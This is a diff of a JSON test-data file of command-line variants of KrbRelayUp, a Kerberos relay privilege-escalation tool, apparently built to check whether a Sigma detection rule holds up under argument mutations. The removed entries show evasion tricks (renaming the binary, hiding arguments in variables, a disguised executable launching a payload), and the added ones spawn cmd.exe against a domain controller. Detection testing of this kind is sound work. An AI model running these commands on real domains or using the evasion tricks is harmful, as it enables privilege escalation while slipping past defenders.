@@ -1,14 +1,34 @@
 [
   {
-    "output": "copy KrbRelayUp.exe benign_tool.exe && .\\benign_tool.exe relay -Domain contoso.local -ComputerName target-host$",
-    "explanation": "This command renames the executable to avoid direct detection and uses standard command-line syntax. It preserves the original behavior for testing purposes."
+    "output": "KrbRelayUp.exe -Domain contoso.com -ComputerName DC01 relay",
+    "explanation": "This command represents a typical execution of KrbRelayUp with the 'relay' command and required flags. It is a baseline for testing detection."
   },
   {
-    "output": "set cmdArg1=krbscm && set cmdArg2=-sc && .\\KrbRelayUp.exe %cmdArg1% %cmdArg2%",
-    "explanation": "This command uses environment variables to obfuscate the command-line arguments while maintaining the same behavior as the original test command."
+    "output": "KrbRelayUp.exe -Domain contoso.com relay -ComputerName DC01",
+    "explanation": "Reordered arguments (-ComputerName flag moved after 'relay') to test if detection is order-dependent."
   },
   {
-    "output": "UpdateService.exe \"spawn\" \"-d\" contoso.local \"-cn\" target-host$ \"-cp\" C:\\Tools\\payload.exe",
-    "explanation": "This command uses quotes and reordered arguments to simulate a test case that aligns with the Sigma rule's detection logic while appearing different."
+    "output": "KrbRelayUp.exe -Domain contoso.com -ComputerName DC01 relay -d contoso.com",
+    "explanation": "Added redundant '-d' flag with equivalent domain name to test detection resilience to argument duplication."
+  },
+  {
+    "output": "KrbRelayUp.exe -Domain contoso.com -ComputerName DC01 \"relay\"",
+    "explanation": "Inserted quotes around 'relay' command to test detection resilience to safe insertion techniques."
+  },
+  {
+    "output": "KrbRelayUp.exe -Domain contoso.com -ComputerName DC01 relay -Domain contoso.com",
+    "explanation": "Duplicated '-Domain' flag to test detection resilience to redundant arguments."
+  },
+  {
+    "output": "KrbRelayUp.exe -d contoso.com -cn DC01 spawn -cp C:\\Windows\\System32\\cmd.exe",
+    "explanation": "Used short flags (-d, -cn, -cp) instead of long flags to test detection resilience to substitution techniques."
+  },
+  {
+    "output": "KrbRelayUp.exe -Domain contoso.com -ComputerName DC01 relay -Domain contoso.com -ComputerName DC01",
+    "explanation": "Duplicated both '-Domain' and '-ComputerName' flags to test detection resilience to redundant arguments."
+  },
+  {
+    "output": "KrbRelayUp.exe -Domain contoso.com -ComputerName DC01 \"relay\" -d contoso.com -cn DC01 spawn -cp C:\\\\Windows\\\\System32\\\\cmd.exe",
+    "explanation": "Combined reordering, substitution, and insertion techniques to test detection resilience to multiple safe mutation techniques."
   }
 ]
